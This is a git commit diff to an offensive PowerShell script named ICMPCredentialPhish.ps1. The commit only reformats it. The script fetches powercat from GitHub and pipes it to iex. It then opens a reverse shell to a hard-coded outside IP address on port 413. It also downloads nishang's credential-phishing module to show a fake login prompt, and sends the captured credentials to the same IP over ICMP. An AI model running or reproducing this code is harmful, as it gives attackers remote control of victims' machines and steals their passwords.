b548ccaeb744a90d0d032324d0c9f98fc29aab7e
unknown <209129@student.pwr.edu.pl>
2020-02-16 02:51:28 +0100

    Fixes

--- Exfiltration/ICMPCredentialPhish.ps1
+++ Exfiltration/ICMPCredentialPhish.ps1
@@ -1,9 +1,8 @@
 ﻿$ip = 51.38.185.232
 $port = 413
 
-& {iwr https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1 | iex
-powercat -c 51.38.185.232 -p 413 -ep }
-
+iwr https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1 | iex
+powercat -c 51.38.185.232 -p 413 -ep 
 
 iwr https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-CredentialsPhish.ps1 | iex
 Invoke-CredentialsPhish | % { 1..10 | % { Invoke-ICMPExfil -Target $ip -Payload $_ -Verbose } }
